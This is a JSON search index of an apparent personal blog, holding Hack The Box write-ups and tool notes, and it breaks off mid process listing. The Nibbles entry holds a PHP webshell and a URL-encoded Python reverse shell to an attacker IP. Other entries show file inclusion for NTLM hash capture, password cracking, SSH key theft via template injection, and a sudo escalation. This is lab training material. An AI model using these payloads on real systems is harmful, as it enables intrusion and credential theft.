[ { "title": "Useful commands", "url": "/posts/useful-commands/", "categories": "HTB", "tags": "Commands", "date": "2023-03-24 13:55:00 +0100", "snippet": "Start listenerFor Linuxsudo nc -nvlp 4444For Windowssudo rlwrap nc -nvlp 443Web servicesudo python3 -m http.server 80SMB service with python impacketsudo smbserver.py share . -smb2supportGet resour...", "content": "Start listenerFor Linuxsudo nc -nvlp 4444For Windowssudo rlwrap nc -nvlp 443Web servicesudo python3 -m http.server 80SMB service with python impacketsudo smbserver.py share . -smb2supportGet resource from serviceSMBcopy \\\\&lt;local_ip&gt;\\share\\winPEAS.exe ." }, { "title": "HTB Squashed", "url": "/posts/htb-Squashed/", "categories": "HTB, Easy", "tags": "Network, Vulnerability Assessment, Common Services, Authentication, Apache, X11, NFS, Reconnaissance, User Enumeration, Impersonation, Arbitrary File Upload, HTB", "date": "2023-03-05 15:22:00 +0100", "snippet": "Reconnaissance/Intelligence GatheringIn this step we collect the target information available in public repositories or sources. We do everything passively.Scanning and enumerationNow it’s time to ...", "content": "Reconnaissance/Intelligence GatheringIn this step we collect the target information available in public repositories or sources. We do everything passively.Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the process.TARGET=10.10.11.191echo \"10.10.11.191 squashed.htb\" | sudo tee -a /etc/hostsWe launch a single TCMP probe to check ping.ping -c 1 $TARGETPing is workingNMAPTo scan the target to find open ports and possible vulnerabilities we use nmap.First, simple TCP scan without DNS resolution and ping discovery, to all the ports and with the version detection.nmap -n -Pn -p- -sV -vvv -oG allPorts $TARGETDiscovered open port 80/tcp on 10.10.11.191Discovered open port 22/tcp on 10.10.11.191Discovered open port 111/tcp on 10.10.11.191Discovered open port 2049/tcp on 10.10.11.191Discovered open port 50061/tcp on 10.10.11.191Discovered open port 37953/tcp on 10.10.11.191Discovered open port 38277/tcp on 10.10.11.191Lot of ports open.80/TCP Apache serverffuf -fc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://squashed.htb/FUZZ111/TCP/UDP - Portmapperrpcinfo squashed.htb program version netid address service owner 100000 4 tcp6 ::.0.111 portmapper superuser 100000 3 tcp6 ::.0.111 portmapper superuser 100000 4 udp6 ::.0.111 portmapper superuser 100000 3 udp6 ::.0.111 portmapper superuser 100000 4 tcp 0.0.0.0.0.111 portmapper superuser 100000 3 tcp 0.0.0.0.0.111 portmapper superuser 100000 2 tcp 0.0.0.0.0.111 portmapper superuser 100000 4 udp 0.0.0.0.0.111 portmapper superuser 100000 3 udp 0.0.0.0.0.111 portmapper superuser 100000 2 udp 0.0.0.0.0.111 portmapper superuser 100000 4 local /run/rpcbind.sock portmapper superuser 100000 3 local /run/rpcbind.sock portmapper superuser 100005 1 udp 0.0.0.0.157.180 mountd superuser 100005 1 tcp 0.0.0.0.195.141 mountd superuser 100005 1 udp6 ::.191.24 mountd superuser 100005 1 tcp6 ::.175.193 mountd superuser 100005 2 udp 0.0.0.0.167.167 mountd superuser 100005 2 tcp 0.0.0.0.149.133 mountd superuser 100005 2 udp6 ::.220.240 mountd superuser 100005 2 tcp6 ::.224.9 mountd superuser 100005 3 udp 0.0.0.0.171.213 mountd superuser 100005 3 tcp 0.0.0.0.160.5 mountd superuser 100005 3 udp6 ::.166.218 mountd superuser 100005 3 tcp6 ::.219.151 mountd superuser 100003 3 tcp 0.0.0.0.8.1 nfs superuser 100003 4 tcp 0.0.0.0.8.1 nfs superuser 100227 3 tcp 0.0.0.0.8.1 nfs_acl superuser 100003 3 udp 0.0.0.0.8.1 nfs superuser 100227 3 udp 0.0.0.0.8.1 nfs_acl superuser 100003 3 tcp6 ::.8.1 nfs superuser 100003 4 tcp6 ::.8.1 nfs superuser 100227 3 tcp6 ::.8.1 nfs_acl superuser 100003 3 udp6 ::.8.1 nfs superuser 100227 3 udp6 ::.8.1 nfs_acl superuser 100021 1 udp 0.0.0.0.163.0 nlockmgr superuser 100021 3 udp 0.0.0.0.163.0 nlockmgr superuser 100021 4 udp 0.0.0.0.163.0 nlockmgr superuser 100021 1 tcp 0.0.0.0.148.65 nlockmgr superuser 100021 3 tcp 0.0.0.0.148.65 nlockmgr superuser 100021 4 tcp 0.0.0.0.148.65 nlockmgr superuser 100021 1 udp6 ::.202.177 nlockmgr superuser 100021 3 udp6 ::.202.177 nlockmgr superuser 100021 4 udp6 ::.202.177 nlockmgr superuser 100021 1 tcp6 ::.147.75 nlockmgr superuser 100021 3 tcp6 ::.147.75 nlockmgr superuser 100021 4 tcp6 ::.147.75 nlockmgr superuser2049 - NFS Serviceshowmount -e 10.10.11.191 Export list for 10.10.11.191:/home/ross */var/www/html *Gaining accessWe will mount the home directory of the user ross into a temporary folder. In order to mount, you must use root privileges.mktemp -dsudo mount -t nfs -o vers=2 10.10.11.191:/home/ross /tmp/tmp.aCuJtaIhO2 -o nolockWe can navigate through the files of ross and find the Keepass DB.Internal reconnaissanceMaintaining accessCommand and ControlPrivilege escalation / lateral movementsExfiltrationCovering tracksNot needed as we are talking of a HTB machine…" }, { "title": "fcrackzip", "url": "/posts/fcrackzip/", "categories": "Tools", "tags": "ZIP, crack, password", "date": "2022-10-29 14:55:00 +0200", "snippet": "fcrackzip is a very nice tool to crack password protected files using dictionaries and brute force.To install we just need to run apt (for Ubuntu/Debian).$ sudo apt install fcrackzipTo test how it ...", "content": "fcrackzip is a very nice tool to crack password protected files using dictionaries and brute force.To install we just need to run apt (for Ubuntu/Debian).$ sudo apt install fcrackzipTo test how it works let’s create a zip file with our flag.$ sudo zip --password abc123 file.zip Desktop/user.txtThen, let’s try to break it up using a dictionary.$ fcrackzip -D -p /usr/share/john/password.lst -u -v -c 'a1' file.zipfound file 'Desktop/user.txt', (size cp/uc 53/ 41, flags 9, chk 66d3)PASSWORD FOUND!!!!: pw == abc123Brute force is also effective in this case.$ fcrackzip -b -l 1-6 -u -v -c 'aA1!' file.zip found file 'Desktop/user.txt', (size cp/uc 53/ 41, flags 9, chk 66d3)checking pw aavpv1 PASSWORD FOUND!!!!: pw == abc123" }, { "title": "Tools for eth hacking", "url": "/posts/tools/", "categories": "Linux", "tags": "Python, Linux, Kali, Tools, Git, stego, javascript, data", "date": "2022-10-16 11:52:00 +0200", "snippet": "Here you can find a list of essentials tools for ethical hacking and CTFs.Git git-dumperPython uncompyle6Javascript jsfuck Decoder-JSFuckData conversion and languages cyberchef brainfuckStego...", "content": "Here you can find a list of essentials tools for ethical hacking and CTFs.Git git-dumperPython uncompyle6Javascript jsfuck Decoder-JSFuckData conversion and languages cyberchef brainfuckStego stegsolve steghide jsteg jstego exiftoolGood list by John Hammond" }, { "title": "Decompile Python with Uncompyle6", "url": "/posts/uncompyle6/", "categories": "Linux", "tags": "Python, uncompyle6, pyc, python-pip", "date": "2022-10-16 11:12:00 +0200", "snippet": "uncompyle6 translates Python bytecode back into equivalent Python source code.It enables the possibility to create .py files using the compiled version .pyc.Install uncompyle6It can be installed wi...", "content": "uncompyle6 translates Python bytecode back into equivalent Python source code.It enables the possibility to create .py files using the compiled version .pyc.Install uncompyle6It can be installed with your package manager.sudo pip install uncompyle6Decompile fileWe just need to run the package to see it in action.uncompyle6 get_flag.cpython-38.pyc -o get_flag.py" }, { "title": "Mongod", "url": "/posts/mongod/", "categories": "HTB, Starting Point", "tags": "Linux, Databases, MongoDB, HTB", "date": "2022-10-01 16:48:00 +0200", "snippet": "Reconnaissance/Intelligence GatheringIn this step we collect the target information available in public repositories or sources. We do everything passively.Scanning and enumerationNow it’s time to ...", "content": "Reconnaissance/Intelligence GatheringIn this step we collect the target information available in public repositories or sources. We do everything passively.Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the process.TARGET=10.129.229.227echo \"10.129.73.196 mongod.htb\" | sudo tee -a /etc/hostsWe launch a single TCMP probe to check ping.ping -c 1 $TARGET\t\t# =&gt; Ping is workingPing is working and from the ttl we are able to see that it is a linux machine.NMAPTo scan the target to find open ports and possible vulnerabilities we use nmap.First, simple TCP scan without DNS resolution and ping discovery, to all the ports and with the version detection.nmap -n -Pn -sV -p- $TARGET -vvv -oG allPortsWe find that the port 27017 is open, we will run the scripts to see what service is listening.nmap -n -Pn -sVC -p27017 $TARGET -vvv -oN targeted27017The result show that it is a MongoDB. We will use mongo cli to see the contents of the database.The flag is inside a collection." }, { "title": "HTB Nibbles", "url": "/posts/nibbles-htb/", "categories": "HTB", "tags": "HTB, Easy, External, Nibbleblog, CVE-2015.6967, A06:2021-Vulnerable And Outdated Components", "date": "2022-08-08 17:58:00 +0200", "snippet": "This is the writeup for Nibbles machine from HTB.Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the p...", "content": "This is the writeup for Nibbles machine from HTB.Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the process.TARGET=10.10.10.75echo \"10.10.10.75 nibbles.htb\" | sudo tee -a /etc/hostsWe launch a single TCMP probe to check ping.ping -c 1 $TARGET\t\t# =&gt; Ping is workingNMAPTo scan the target to find open ports and possible vulnerabilities we use nmap.First, simple TCP scan without DNS resolution and ping discovery, to all the ports and with the version detection.nmap -n -Pn -sV -p- $TARGET -vvv -oG allPortsNibbleblogFirst we visit the site http://nibbles.htb, from the source code we can see that there is an indication to nibbleblog. This is an important clue because we can already check on the internet.CSRFRCE in My Image pluginIt looks like to exploit the RCE we might need to be logged in. This is something somehow difficult, because it requires guessing and the machine has a protection in place to avoid people from using tools like hydra.The user can be obtained from the &lt;/nibbleblog/content/private/users.xml&gt; and the password must be guessed. (In real life probably we should have exploit the CSRF or XSS and wait for the user to login, with this blacklist protection is hard…)Once we are inside we are going to use CVE-2015-6967 to upload a ‘php webshell.echo \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" &gt; cmd.phpIgnore the warnings after uploading the image and go to _&lt;/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami&gt;. It will display the username._Gaining accessJust launch a reverse shell (I like the shortest python3…)http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.14.8%22%2C7890%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27Privilege escalation / lateral movementsWe execute sudo -l to understand if it is possible to execute commands as sudo. We see that it is possible to execute sudo /home/nibbler/personal/stuff/monitor.shThe file doesn’t exist so we just need to create it and grant permissionsmkdir /home/nibbler/personalmkdir /home/nibbler/personal/stuffecho \"bash -i\" &gt; /home/nibbler/personal/stuff/monitor.shchmod +x /home/nibbler/personal/stuff/monitor.shsudo /home/nibbler/personal/stuff/monitor.shAnd we are root!" }, { "title": "HTB Responder", "url": "/posts/htb-responder/", "categories": "HTB, Starting Point", "tags": "SAMBA, Apache, WinRM, Enumeration", "date": "2022-08-03 19:55:00 +0200", "snippet": "In this machine we will experiment with SMB relay attacks using a remote file inclusion in a website and connecting through Windows remote management system.Scanning and enumerationNow it’s time to...", "content": "In this machine we will experiment with SMB relay attacks using a remote file inclusion in a website and connecting through Windows remote management system.Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the process.TARGET=10.129.5.42echo \"10.129.5.42 responder.htb\" | sudo tee -a /etc/hostsWe launch a single TCMP probe to check ping.ping -c 1 $TARGET\t\t# =&gt; Ping is workingWe can see that it’s a Windows system.PING 10.129.5.42 (10.129.5.42) 56(84) bytes of data.64 bytes from 10.129.5.42: icmp_seq=1 ttl=127 time=55.0 ms--- 10.129.5.42 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 54.962/54.962/54.962/0.000 msNMAPTo scan the target to find open ports and possible vulnerabilities we use nmap.First, simple TCP scan without DNS resolution and ping discovery, to all the ports and with the version detection. (I applied here --min-rate as the scan was very slow and we don’t care about HTB machines…)nmap -n -Pn -sV -p- --min-rate 5000 $TARGET -vvv -oG allPortsWe can see that it has the following ports open:PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)7680/tcp open pando-pub? syn-ackService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWe also start a UDP check.sudo nmap -n -Pn -sVC -sU -p- --min-rate 5000 $TARGET -vvv -oG allPortsUDPNothing here of interest.We pass the scripts.nmap -n -Pn -sVC -oN targeted -vvv -p80,5985,7680 $TARGETWebsite in 80whatweb http://responder.htbhttp://responder.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.5.42], Meta-Refresh-Redirect[http://unika.htb/], OpenSSL[1.1.1m], PHP[8.1.1], X-Powered-By[PHP/8.1.1]ERROR Opening: http://unika.htb/ - no address for unika.htbWe see that it is redirecting to http://unika.htb which we might need to also include in the hosts file after inspecting.echo \"10.129.5.42 unika.htb\" | sudo tee -a /etc/hostsWe can inspect the source code of the site.By inspecting the site we can see that we have a language selector that is loading the language file using a page parameter.We can try to see if we are capable of launching a LFI.http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hostsIt works. If we see an error message from php include, it can also provide information that the server is vulnerable to file inclusion. In this case we are using a local file inclusion, the idea is to link a remote file inclusion with a Samba relay attack.We will start Responder.py that in kali is located in /usr/share/responder. The interface used is the VPN tunnel from HTB.sudo Responder.py -I tun0Then, we will call in the browser the remote file inclusion asking for a file in our server.http://unika.htb/index.php?page=//10.10.14.221/helloWe will see in the responder that we intercepted the NTLM hash from the user. We just need to crack it with john and see if the user is using a common password.john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txtPlease note that we put -w*=*/usr/share, it’s very important to include the =. Sometimes we are use to put just the flag and we see strange errors from john about the UTF-8.Gaining accessNow that we have the password we are able to start a session in the PC. You can use evil-winrm and see the flag." }, { "title": "HTB Redeemer", "url": "/posts/htb-redeemer/", "categories": "HTB, Starting Point", "tags": "Linux, Redis, Enumeration, Anonymous/Guest access, HTB, Easy", "date": "2022-08-03 18:55:00 +0200", "snippet": "Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the process.TARGET=10.129.73.196echo \"10.129.73.196 re...", "content": "Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the process.TARGET=10.129.73.196echo \"10.129.73.196 redeemer.htb\" | sudo tee -a /etc/hostsWe launch a single TCMP probe to check ping.ping -c 1 $TARGET\t\t# =&gt; Ping is workingWe get the response, the machine is Linux.PING 10.129.73.196 (10.129.73.196) 56(84) bytes of data.64 bytes from 10.129.73.196: icmp_seq=1 ttl=63 time=57.5 ms--- 10.129.73.196 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 57.510/57.510/57.510/0.000 msNMAPTo scan the target to find open ports and possible vulnerabilities we use nmap.First, simple TCP scan without DNS resolution and ping discovery, to all the ports and with the version detection.nmap -n -Pn -sV -p- $TARGET -vvv -oG allPortsThe service running is a Redis, which is an in-memory database.PORT STATE SERVICE REASON VERSION6379/tcp open redis syn-ack Redis key-value store 5.0.7RedisIf you don’t have you can install redis tools.sudo apt install redis-tools -yIt looks like the Redis is open, we just need to connect.redis-cli -h $TARGETThe reference for Redis commands is hereThe important commands here are: INFO it will help to see the information and stats of the Redis server. As we can see it’s a master and we have 1 database db0 SELECT 0 to select the database. KEYS * to display all the available keys. GET flag to see the flag." }, { "title": "HTB Late", "url": "/posts/htb-late/", "categories": "HTB, Easy", "tags": "HTB, OCR, SSTI, SSH, Easy", "date": "2022-08-03 16:55:00 +0200", "snippet": "Reconnaissance/Intelligence GatheringIn this step we collect the target information available in public repositories or sources. We do everything passively.Scanning and enumerationNow it’s time to ...", "content": "Reconnaissance/Intelligence GatheringIn this step we collect the target information available in public repositories or sources. We do everything passively.Scanning and enumerationNow it’s time to start the active scanning.As always, we define our TARGET and hosts file of our machine to facilitate the process.TARGET=&lt;ip_of_the_machine&gt;sudo nano /etc/hosts # Add a line with the machine IP /t late.htbWe launch a single TCMP probe to check ping.ping -c 1 $TARGET\t\t# =&gt; Ping is workingNMAPTo scan the target to find open ports and possible vulnerabilities we use nmap.First, simple TCP scan without DNS resolution and ping discovery, to all the ports and with the version detection.nmap -n -Pn -sV -p- $TARGET -vvv -oG allPortsPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack nginx 1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThen we launch the standard scripts in the ports open but nothing shows.nmap -n -Pn -sVC -p22,80 $TARGET -oN targetedWe launch also a UDP scan.sudo nmap -n -Pn -sV -sU -p- $TARGET -vvv -oG allPortsUDPDirectory fuzzingwfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://late.htb/FUZZWe find assets (normal stuff in a website).SubdomainVisiting the site we see that there is already a link to http://images.late.htb. We can add it also to the hosts file.echo '10.10.11.156 images.late.htb' | sudo tee -a /etc/hostsThe site is a flask utility to convert images to text. This is a nice project by lucadibello.We can do some random tests with images with text to verify that after clicking in SCAN the application is using OCR tesseract to read the text in the image.Gaining accessTo gain access to the system, the test consists in using template injection in the text that the application is reading SSTI. The repo from luca is not vulnerable but we will try.The process consists in crafting an image with the ``.After a lot of trial and error and following hacktricks recommendations I managed to get the /etc/passwd.And then we try to obtain the ssh key from the user with login (svc_acc)Like always we must set the correct permissions to our id_rsa file.chmod 400 id_rsassh -i id_rsa svc_acc@late.htbInternal reconnaissanceUser flag can be obtained directly from the home of the user. We can see that we have an app folder in the home directory that it is running the web application.Here we can see the code that is vulnerable to SSTI.import datetimeimport os, randomfrom flask.templating import render_template_stringfrom werkzeug.utils import secure_filenameimport PIL.Imageimport pytesseractfrom PIL import Imagefrom flask import Flask, request, render_template, redirect, url_for, session, send_fileapp = Flask(__name__)upload_dir = \"/home/svc_acc/app/uploads\"misc_dir = '/home/svc_acc/app/misc'allowed_extensions = [\"jpg\" ,'png']app.secret_key = b'_5#y2L\"F4Q8z\\n\\xec]/'@app.route('/')def home(): return render_template(\"index.html\", title=\"Image Reader\")@app.route('/scanner', methods=['GET', 'POST'])def scan_file(): scanned_text = '' results = '' if request.method == 'POST': start_time = datetime.datetime.now() f = request.files['file'] if f.filename.split('.')[-1] in allowed_extensions: try: ID = str(random.randint(1,10000)) file_name = upload_dir + \"/\" + secure_filename(f.filename )+ ID f.save(file_name) pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract' scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name)) results = \"\"\"&lt;p&gt;{}&lt;/p&gt;\"\"\".format(scanned_text) r = render_template_string(results) path = misc_dir + \"/\" + ID + '_' + 'results.txt' with open(path, 'w') as f: f.write(r) return send_file(path, as_attachment=True,attachment_filename='results.txt') except Exception as e: return ('Error occured while processing the image: ' + str(e)) else: return 'Invalid Extension'I like to execute linpeas.sh to explore the machine.Hostiduid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)whoamisvc_accsudo -l[sudo] password for svc_acc:hostnamelateifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 10.10.11.156 netmask 255.255.254.0 broadcast 10.10.11.255 inet6 dead:beef::250:56ff:feb9:a38 prefixlen 64 scopeid 0x0&lt;global&gt; inet6 fe80::250:56ff:feb9:a38 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:50:56:b9:0a:38 txqueuelen 1000 (Ethernet) RX packets 92021 bytes 9382261 (9.3 MB) RX errors 0 dropped 38 overruns 0 frame 0 TX packets 86720 bytes 14758043 (14.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 85257 bytes 10350294 (10.3 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 85257 bytes 10350294 (10.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0Networkmountsysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)udev on /dev type devtmpfs (rw,nosuid,relatime,size=987732k,nr_inodes=246933,mode=755)devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204116k,mode=755)/dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4 (rw,relatime,data=ordered)securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=25,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14470)debugfs on /sys/kernel/debug type debugfs (rw,relatime)mqueue on /dev/mqueue type mqueue (rw,relatime)hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)configfs on /sys/kernel/config type configfs (rw,relatime)/dev/sda2 on /boot type ext4 (rw,relatime,data=ordered)lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204112k,mode=700,uid=1000,gid=1000)netstat -nlp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN 1199/python3 tcp 0 0 127.0.0.1:587 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 0.0.0.0:5353 0.0.0.0:* - udp 0 0 0.0.0.0:57672 0.0.0.0:* - udp6 0 0 :::5353 :::* - udp6 0 0 :::38142 :::* - Active UNIX domain sockets (only servers)Proto RefCnt Flags Type State I-Node PID/Program name Pathunix 2 [ ACC ] SEQPACKET LISTENING 13241 - /run/udev/controlunix 2 [ ACC ] STREAM LISTENING 69690 4127/systemd /run/user/1000/systemd/privateunix 2 [ ACC ] STREAM LISTENING 69694 4127/systemd /run/user/1000/busunix 2 [ ACC ] STREAM LISTENING 69695 4127/systemd /run/user/1000/gnupg/S.dirmngrunix 2 [ ACC ] STREAM LISTENING 69696 4127/systemd /run/user/1000/gnupg/S.gpg-agent.extraunix 2 [ ACC ] STREAM LISTENING 69697 4127/systemd /run/user/1000/gnupg/S.gpg-agent.sshunix 2 [ ACC ] STREAM LISTENING 69698 4127/systemd /run/user/1000/gnupg/S.gpg-agentunix 2 [ ACC ] STREAM LISTENING 69699 4127/systemd /run/user/1000/gnupg/S.gpg-agent.browserunix 2 [ ACC ] STREAM LISTENING 18890 - /run/uuidd/requestunix 2 [ ACC ] STREAM LISTENING 18896 - /var/run/dbus/system_bus_socketunix 2 [ ACC ] STREAM LISTENING 18899 - /run/avahi-daemon/socketunix 2 [ ACC ] STREAM LISTENING 19707 - @irqbalance1028.sockunix 2 [ ACC ] STREAM LISTENING 18888 - /var/lib/lxd/unix.socketunix 2 [ ACC ] STREAM LISTENING 23236 - /var/run/sendmail/mta/smcontrolunix 2 [ ACC ] STREAM LISTENING 17267 - /var/run/vmware/guestServicePipeunix 2 [ ACC ] STREAM LISTENING 18881 - @ISCSIADM_ABSTRACT_NAMESPACEunix 2 [ ACC ] STREAM LISTENING 14462 - /run/systemd/privateunix 2 [ ACC ] STREAM LISTENING 14473 - /run/systemd/journal/stdoutunix 2 [ ACC ] STREAM LISTENING 13228 - /run/lvm/lvmetad.socketunix 2 [ ACC ] STREAM LISTENING 13238 - /run/lvm/lvmpolld.socketunix 2 [ ACC ] STREAM LISTENING 18882 - /run/acpid.socketProcessps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.4 159576 8776 ? Ss 18:36 0:03 /sbin/init maybe-ubiquityroot 2 0.0 0.0 0 0 ? S 18:36 0:00 [kthreadd]root 4 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kworker/0:0H]root 6 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [mm_percpu_wq]root 7 0.0 0.0 0 0 ? S 18:36 0:00 [ksoftirqd/0]root 8 0.0 0.0 0 0 ? I 18:36 0:02 [rcu_sched]root 9 0.0 0.0 0 0 ? I 18:36 0:00 [rcu_bh]root 10 0.0 0.0 0 0 ? S 18:36 0:00 [migration/0]root 11 0.0 0.0 0 0 ? S 18:36 0:00 [watchdog/0]root 12 0.0 0.0 0 0 ? S 18:36 0:00 [cpuhp/0]root 13 0.0 0.0 0 0 ? S 18:36 0:00 [cpuhp/1]root 14 0.0 0.0 0 0 ? S 18:36 0:00 [watchdog/1]root 15 0.0 0.0 0 0 ? S 18:36 0:00 [migration/1]root 16 0.0 0.0 0 0 ? S 18:36 0:00 [ksoftirqd/1]root 18 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kworker/1:0H]root 19 0.0 0.0 0 0 ? S 18:36 0:00 [kdevtmpfs]root 20 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [netns]root 21 0.0 0.0 0 0 ? S 18:36 0:00 [rcu_tasks_kthre]root 22 0.0 0.0 0 0 ? S 18:36 0:00 [kauditd]root 23 0.0 0.0 0 0 ? I 18:36 0:00 [kworker/0:1]root 24 0.0 0.0 0 0 ? S 18:36 0:00 [khungtaskd]root 25 0.0 0.0 0 0 ? S 18:36 0:00 [oom_reaper]root 26 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [writeback]root 27 0.0 0.0 0 0 ? S 18:36 0:00 [kcompactd0]root 28 0.0 0.0 0 0 ? SN 18:36 0:00 [ksmd]root 29 0.0 0.0 0 0 ? SN 18:36 0:00 [khugepaged]root 30 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [crypto]root 31 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kintegrityd]root 32 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kblockd]root 33 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [ata_sff]root 34 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [md]root 35 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [edac-poller]root 36 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [devfreq_wq]root 37 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [watchdogd]root 41 0.0 0.0 0 0 ? S 18:36 0:00 [kswapd0]root 42 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kworker/u5:0]root 43 0.0 0.0 0 0 ? S 18:36 0:00 [ecryptfs-kthrea]root 85 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [kthrotld]root 86 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [acpi_thermal_pm]root 87 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_0]root 88 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_0]root 89 0.0 0.0 0 0 ? S 18:36 0:00 [scsi_eh_1]root 90 0.0 0.0 0 0 ? I&lt; 18:36 0:00 [scsi_tmf_1]root 96 0.0 